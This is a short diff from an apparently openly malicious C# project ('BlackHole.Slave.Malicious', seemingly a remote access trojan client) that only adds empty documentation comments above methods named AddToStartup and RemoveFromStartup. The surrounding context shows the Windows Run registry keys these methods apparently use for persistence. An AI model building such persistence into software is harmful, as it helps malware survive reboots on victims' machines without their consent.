@@ -38,6 +38,10 @@ namespace BlackHole.Slave.Malicious
                 ? "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                 : "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";        
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <returns></returns>
         public static bool AddToStartup()
         {
             if (WindowsHelper.AccountType == "Admin")
@@ -58,6 +62,10 @@ namespace BlackHole.Slave.Malicious
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <returns></returns>
         public static bool RemoveFromStartup()
         {
             if (WindowsHelper.AccountType == "Admin")
